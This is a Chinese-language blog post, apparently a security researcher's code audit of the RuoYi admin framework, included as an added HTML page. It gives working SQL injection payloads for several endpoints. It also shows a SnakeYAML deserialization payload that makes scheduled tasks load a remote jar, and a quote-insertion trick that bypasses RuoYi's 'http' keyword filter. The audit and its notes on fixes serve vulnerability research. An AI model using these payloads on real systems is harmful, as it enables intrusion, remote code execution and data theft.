@@ -1,0 +1,827 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Ruoyi环境部署源码下载 1git clone https:&#x2F;&#x2F;gitee.com&#x2F;y_project&#x2F;RuoYi.git  使用git checkout v4.0切换版本 git tag可查看版本 修改application-druid.yaml中的数据库连接地址以及数据库账号密码   导入以下两个sql文件到MySQL中即可启动Ruoyiapplication   SQL注入${params">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ruoyi代码审计">
+<meta property="og:url" content="https://ggji13123.github.io/2024/09/21/ruoyi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="ggji">
+<meta property="og:description" content="Ruoyi环境部署源码下载 1git clone https:&#x2F;&#x2F;gitee.com&#x2F;y_project&#x2F;RuoYi.git  使用git checkout v4.0切换版本 git tag可查看版本 修改application-druid.yaml中的数据库连接地址以及数据库账号密码   导入以下两个sql文件到MySQL中即可启动Ruoyiapplication   SQL注入${params">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729150240000.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729150540616.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729151118793.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729154053746.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729154252789.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729154337512.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729154439817.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729154711374.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729154836067.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729154950925.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729155515014.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729160348742.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729160532488.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729164410372.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729164521555.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729165330258.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729170754282.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729171234561.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729171351962.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729171446253.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919233530009.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919233646641.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919234507841.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919234521412.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919234609216.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919232449306.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729192245752.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729192502616.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729192926948.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729201902058.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729234118929.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729234715468.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729235028795.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240730175941468.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919214949224.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919215433505.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919215815032.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919224202010.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919224127786.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919224919597.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240919225004351.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240921201833958.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240921203525989.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/ruoyi/image-20240921204045892.png">
+<meta property="article:published_time" content="2024-09-21T12:47:10.000Z">
+<meta property="article:modified_time" content="2024-09-21T12:50:53.929Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ggji13123.github.io/image/ruoyi/image-20240729150240000.png">
+  
+  
+  
+  <title>ruoyi代码审计 - ggji</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ggji13123.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>guguji</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ruoyi代码审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-21 20:47" pubdate>
+          2024年9月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ruoyi代码审计</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Ruoyi环境部署"><a href="#Ruoyi环境部署" class="headerlink" title="Ruoyi环境部署"></a>Ruoyi环境部署</h1><p>源码下载</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://gitee.com/y_project/RuoYi.git<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>git checkout v4.0</code>切换版本</p>
+<p><code>git tag</code>可查看版本</p>
+<p>修改application-druid.yaml中的数据库连接地址以及数据库账号密码</p>
+<p><img src="/image/ruoyi/image-20240729150240000.png" srcset="/img/loading.gif" lazyload alt="image-20240729150240000"> </p>
+<p>导入以下两个sql文件到MySQL中即可启动Ruoyiapplication</p>
+<p><img src="/image/ruoyi/image-20240729150540616.png" srcset="/img/loading.gif" lazyload alt="image-20240729150540616"> </p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="params-dataScope"><a href="#params-dataScope" class="headerlink" title="${params.dataScope}"></a>${params.dataScope}</h2><p>存在于SysUserMapper中，其中多处存在未经过预编译的变量<code>$&#123;params.dataScope&#125;</code></p>
+<p><img src="/image/ruoyi/image-20240729151118793.png" srcset="/img/loading.gif" lazyload alt="image-20240729151118793"> </p>
+<hr>
+<h3 id="寻找可利用的接口"><a href="#寻找可利用的接口" class="headerlink" title="寻找可利用的接口"></a>寻找可利用的接口</h3><h4 id="1-selectUserList"><a href="#1-selectUserList" class="headerlink" title="1.selectUserList"></a>1.selectUserList</h4><p>第一处是在<code>selectUserList</code>中</p>
+<img src="/image/ruoyi/image-20240729154053746.png" srcset="/img/loading.gif" lazyload alt="image-20240729154053746" style="zoom:67%;" />  
+
+<p>通过mybatisx找到接口</p>
+<p><img src="/image/ruoyi/image-20240729154252789.png" srcset="/img/loading.gif" lazyload alt="image-20240729154252789"> </p>
+<p>寻找使用该接口的地方</p>
+<p><img src="/image/ruoyi/image-20240729154337512.png" srcset="/img/loading.gif" lazyload alt="image-20240729154337512"> </p>
+<p>系统中只存在一处调用<code>selectUserList</code>的地方</p>
+<img src="/image/ruoyi/image-20240729154439817.png" srcset="/img/loading.gif" lazyload alt="image-20240729154439817" style="zoom: 67%;" />   
+
+<p>继续向上查找，可以找到两处调用</p>
+<p><img src="/image/ruoyi/image-20240729154711374.png" srcset="/img/loading.gif" lazyload alt="image-20240729154711374"> </p>
+<h5 id="系统查询用户"><a href="#系统查询用户" class="headerlink" title="系统查询用户"></a>系统查询用户</h5><p><strong>第一处对应的接口为<code>/system/user/list</code>，此处的User对象可控</strong></p>
+<p><img src="/image/ruoyi/image-20240729154836067.png" srcset="/img/loading.gif" lazyload alt="image-20240729154836067"> </p>
+<p>该接口为系统查询用户调用的接口，正常调用传递的参数如下</p>
+<p><img src="/image/ruoyi/image-20240729154950925.png" srcset="/img/loading.gif" lazyload alt="image-20240729154950925"> </p>
+<p>此时只需要对params赋值多一个属性<code>dataScope</code>，值为<code>and sleep(5)</code>，系统响应时间变慢，可证明漏洞存在</p>
+<p>这里可以利用报错注入回显信息，payload如下</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and+extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select+database</span>()),<span class="hljs-number">0</span>x7e))<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/image/ruoyi/image-20240729155515014.png" srcset="/img/loading.gif" lazyload alt="image-20240729155515014"> </p>
+<h5 id="用户列表导出"><a href="#用户列表导出" class="headerlink" title="用户列表导出"></a>用户列表导出</h5><p><strong>第二处调用对应的功能接口是用户列表导出，接口为<code>/system/user/export</code></strong></p>
+<p>正常传参如下，利用方式相同，为<code>params[dataScope]</code>赋值即可</p>
+<p><img src="/image/ruoyi/image-20240729160348742.png" srcset="/img/loading.gif" lazyload alt="image-20240729160348742"> </p>
+<p><img src="/image/ruoyi/image-20240729160532488.png" srcset="/img/loading.gif" lazyload alt="image-20240729160532488"> </p>
+<h4 id="2-selectAllocatedList"><a href="#2-selectAllocatedList" class="headerlink" title="2.selectAllocatedList"></a>2.<code>selectAllocatedList</code></h4><h5 id="分配用户功能"><a href="#分配用户功能" class="headerlink" title="分配用户功能"></a>分配用户功能</h5><p>同样寻找调用该接口的地方</p>
+<p> 在<code>allocatedList</code>中发生调用</p>
+<p>接口地址为<code>/system/role/authUser/allocatedList</code>,功能点如下</p>
+<p> <img src="/image/ruoyi/image-20240729164410372.png" srcset="/img/loading.gif" lazyload alt="image-20240729164410372"> </p>
+<p>同样的只需要加上params[dataScope]属性即可实现注入</p>
+<p><img src="/image/ruoyi/image-20240729164521555.png" srcset="/img/loading.gif" lazyload alt="image-20240729164521555"></p>
+<h4 id="3-selectUnallocatedList"><a href="#3-selectUnallocatedList" class="headerlink" title="3.selectUnallocatedList"></a>3.selectUnallocatedList</h4><h5 id="查询未授权用户列表"><a href="#查询未授权用户列表" class="headerlink" title="查询未授权用户列表"></a>查询未授权用户列表</h5><p>功能点接口为<code>/system/role/authUser/unallocatedList</code></p>
+<p>此接口会在添加用户中调用<img src="/image/ruoyi/image-20240729165330258.png" srcset="/img/loading.gif" lazyload alt="image-20240729165330258"> </p>
+<p>利用方式同上</p>
+<h4 id="4-selectDeptList"><a href="#4-selectDeptList" class="headerlink" title="4.selectDeptList"></a>4.selectDeptList</h4><p>找到的接口有两处</p>
+<h5 id="部门列表查询"><a href="#部门列表查询" class="headerlink" title="部门列表查询"></a>部门列表查询</h5><p>第一处接口为<code>/system/dept/list</code></p>
+<p>如下</p>
+<p><img src="/image/ruoyi/image-20240729170754282.png" srcset="/img/loading.gif" lazyload alt="image-20240729170754282"></p>
+<p> 同上赋值即可实现注入</p>
+<p><img src="/image/ruoyi/image-20240729171234561.png" srcset="/img/loading.gif" lazyload alt="image-20240729171234561"> </p>
+<p>第二处为系统调用，传入参数不可控，无法利用</p>
+<p><img src="/image/ruoyi/image-20240729171351962.png" srcset="/img/loading.gif" lazyload alt="image-20240729171351962"> </p>
+<h4 id="5-规则列表"><a href="#5-规则列表" class="headerlink" title="5.规则列表"></a>5.规则列表</h4><p>同上</p>
+<h2 id="ancestors"><a href="#ancestors" class="headerlink" title="${ancestors}"></a>${ancestors}</h2><h4 id="6-updateDeptStatus"><a href="#6-updateDeptStatus" class="headerlink" title="6.updateDeptStatus"></a>6.updateDeptStatus</h4><p>在updateDeptStatus中也存在没有经过预编译的参数<code>ancestors</code><img src="/image/ruoyi/image-20240729171446253.png" srcset="/img/loading.gif" lazyload alt="image-20240729171446253"> </p>
+<h5 id="修改部门"><a href="#修改部门" class="headerlink" title="修改部门"></a>修改部门</h5><p>此处的功能点为更新部门状态</p>
+<p>调用的接口为<code>/system/dept/edit</code></p>
+<p>在修改部门提交时，将<code>ancestors</code>修改为<code>0)+or+sleep(3)#</code>，系统响应变慢说明存在漏洞</p>
+<p>此处需要注意in中的值不可为空！</p>
+<p>同样可以使用报错注入的payload利用</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0</span>)<span class="hljs-keyword">or</span>(extractvalue(<span class="hljs-number">1</span>,concat((<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>()))))</span>;<span class="hljs-meta">#</span><br><br></code></pre></td></tr></table></figure>
+
+<p><strong>此处sql语句过长会报错导致无回显</strong></p>
+<h4 id="7-createTable接口"><a href="#7-createTable接口" class="headerlink" title="7.createTable接口"></a>7.createTable接口</h4><p>版本：4.7.0&lt;x&lt;4.7.5</p>
+<p>mapper中存在此变量${sql}</p>
+<p><img src="/image/ruoyi/image-20240919233530009.png" srcset="/img/loading.gif" lazyload alt="image-20240919233530009"> </p>
+<p>通过寻找调用，找到如下接口createTable</p>
+<p><img src="/image/ruoyi/image-20240919233646641.png" srcset="/img/loading.gif" lazyload alt="image-20240919233646641"></p>
+<p> 直接插入sql语句会出现报错</p>
+<p><img src="/image/ruoyi/image-20240919234507841.png" srcset="/img/loading.gif" lazyload alt="image-20240919234507841"></p>
+<p>根据报错内容查找到以下拦截器，可见拦截方式是通过匹配黑名单字符</p>
+<p><img src="/image/ruoyi/image-20240919234521412.png" srcset="/img/loading.gif" lazyload alt="image-20240919234521412"> </p>
+<p> <img src="/image/ruoyi/image-20240919234609216.png" srcset="/img/loading.gif" lazyload alt="image-20240919234609216"> </p>
+<p>此处只有create关键字可以生效</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">table</span> ss1 <span class="hljs-keyword">as</span>  <span class="hljs-comment">/**/</span><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>version()),<span class="hljs-number">0x7e</span>));<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="sql注入修复"><a href="#sql注入修复" class="headerlink" title="sql注入修复"></a>sql注入修复</h2><p>在若衣的后续修复中，针对<code>params[dataScope]</code>参数新增如下过滤</p>
+<p>作用是在查询前将此参数清空，避免sql注入</p>
+<p><img src="/image/ruoyi/image-20240919232449306.png" srcset="/img/loading.gif" lazyload alt="image-20240919232449306"> </p>
+<hr>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>寻找过程，全局搜索exec，可以找到以下抽象类，根据名字判断有可能是用于运行系统任务</p>
+<p><img src="/image/ruoyi/image-20240729192245752.png" srcset="/img/loading.gif" lazyload alt="image-20240729192245752"> </p>
+<p>查看他的实现</p>
+<p><img src="/image/ruoyi/image-20240729192502616.png" srcset="/img/loading.gif" lazyload alt="image-20240729192502616"> </p>
+<p>其中调用了<code>JobInvokeUtil.invokeMethod</code>,跟进查看</p>
+<p><img src="/image/ruoyi/image-20240729192926948.png" srcset="/img/loading.gif" lazyload alt="image-20240729192926948"> </p>
+<p>会进入到一个同名方法中，这个同名方法可跟进传入的类名，方法名，方法参数去执行</p>
+<p>这样我们可以通过传入特定的可控制的三个参数即可实现rce，此处得到运行命令的方法</p>
+<p>接下来是寻找利用过程</p>
+<p>向上查找，最后找到的是<code>AbstractQuartzJob.execute</code></p>
+<p><img src="/image/ruoyi/image-20240729201902058.png" srcset="/img/loading.gif" lazyload alt="image-20240729201902058"> </p>
+<p>此处为java定时任务的调用，而系统功能中也存在定时任务功能</p>
+<p>通过打断点，运行定时任务，确定定时任务功能可以走到此处，并且参数可以自定义</p>
+<p>此处使用到的是，<code>org.yaml.snakeyaml.Yaml.load</code>反序列化</p>
+<p>这种反序列化与fastjson有些许相似</p>
+<hr>
+<h3 id="snakeyaml反序列化"><a href="#snakeyaml反序列化" class="headerlink" title="snakeyaml反序列化"></a>snakeyaml反序列化</h3><p>以下为snakeryaml的一个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialize</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>    user.setName(<span class="hljs-string">&quot;guguji&quot;</span>);<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dump</span> <span class="hljs-operator">=</span> yaml.dump(user);<br>    System.out.println(dump);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Deserialize</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.demo.User &#123;name: guguji, age: 18&#125;&quot;</span>;<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此处的<code>!!</code>类似于<code>@type</code>,需要写全类名，后面加上参数以及对其的赋值</p>
+<p>回到若衣，此处验证漏洞使用的是<code>java.net.URL</code>来进行dns外带验证</p>
+<p>payload如下</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">org.yaml.snakeyaml.Yaml.<span class="hljs-keyword">load</span>(&#x27;!<span class="hljs-title">!javax.script.ScriptEngineManager</span> [!<span class="hljs-title">!java.net.URLClassLoader</span> [[!<span class="hljs-title">!java.net.URL</span> [<span class="hljs-string">&quot;http://xxx.dnslog.cn/&quot;</span>]]]]&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>将payload写入定时任务中，打断点，查看运行过程</p>
+<p>程序进入execute，再进行doExecute中，并且将定时任务的参数带入，继续跟进</p>
+<p><img src="/image/ruoyi/image-20240729234118929.png" srcset="/img/loading.gif" lazyload alt="image-20240729234118929"> </p>
+<p>接下来进入到<code>invokeMethod</code>中，对<code>beanName、methodParams、methodName</code>这三个上述提到的参数进行赋值</p>
+<p><img src="/image/ruoyi/image-20240729234715468.png" srcset="/img/loading.gif" lazyload alt="image-20240729234715468"> </p>
+<p>传入<code>invokeMethod(bean, methodName, methodParams);</code>中后就会进行反射调用</p>
+<p>反射调用<code>org.yaml.snakeyaml.load(&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://xxx.dnslog.cn/&quot;]]]]&quot;)</code></p>
+<p>接下来就是snakeyaml的反序列化的过程</p>
+<p>这样就会向dnslog发送请求</p>
+<p><img src="/image/ruoyi/image-20240729235028795.png" srcset="/img/loading.gif" lazyload alt="image-20240729235028795"> </p>
+<p>命令执行也通过URLClassLoader进行远程加载</p>
+<p>此处似乎无法使用<code>JdbcRowSetImpl</code>这条链，在若衣中会将逗号识别出来，导致传入两个参数，导致失败</p>
+<p>在github上下载payload<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">GitHub - artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads</a></p>
+<p>修改一下payload，按照文档打包成jar</p>
+<p>开启python服务,添加以下定时任务</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">org.yaml.snakeyaml.Yaml.<span class="hljs-keyword">load</span>(&#x27;!<span class="hljs-title">!javax.script.ScriptEngineManager</span> [!<span class="hljs-title">!java.net.URLClassLoader</span> [[!<span class="hljs-title">!java.net.URL</span> [<span class="hljs-string">&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;</span>]]]]&#x27;)<br></code></pre></td></tr></table></figure>
+
+<img src="/image/ruoyi/image-20240730175941468.png" srcset="/img/loading.gif" lazyload alt="image-20240730175941468" style="zoom:50%;" />  
+
+
+
+<h2 id="定时任务命令执行修复绕过"><a href="#定时任务命令执行修复绕过" class="headerlink" title="定时任务命令执行修复绕过"></a>定时任务命令执行修复绕过</h2><h4 id="4-6-2"><a href="#4-6-2" class="headerlink" title="4.6.2"></a>4.6.2</h4><p>此版本只针对rmi服务，并不会对http协议进行影响，如下图</p>
+<p><img src="/image/ruoyi/image-20240919214949224.png" srcset="/img/loading.gif" lazyload alt="image-20240919214949224"> </p>
+<h4 id="4-6-2-1"><a href="#4-6-2-1" class="headerlink" title="4.6.2&lt;&#x3D;Ruoyi&lt;4.7.2"></a>4.6.2&lt;&#x3D;Ruoyi&lt;4.7.2</h4><p>在这些版本中，后端对保存的定时任务进行校验，不允许有http，rmi，ldap</p>
+<p><img src="/image/ruoyi/image-20240919215433505.png" srcset="/img/loading.gif" lazyload alt="image-20240919215433505"></p>
+<p>此时进行提交会报错并无法进行定时任务执行</p>
+<img src="/image/ruoyi/image-20240919215815032.png" srcset="/img/loading.gif" lazyload alt="image-20240919215815032" style="zoom:67%;" />    
+
+<p>从代码出可看出，此处的拒绝条件只是对传入的字符进行匹配，若出现关键字则拒绝保存</p>
+<p>所以此处可以加上一些特殊符号进行绕过</p>
+<p>只需要将<code>http</code>修改为<code>ht&#39;tp</code>,即可绕过</p>
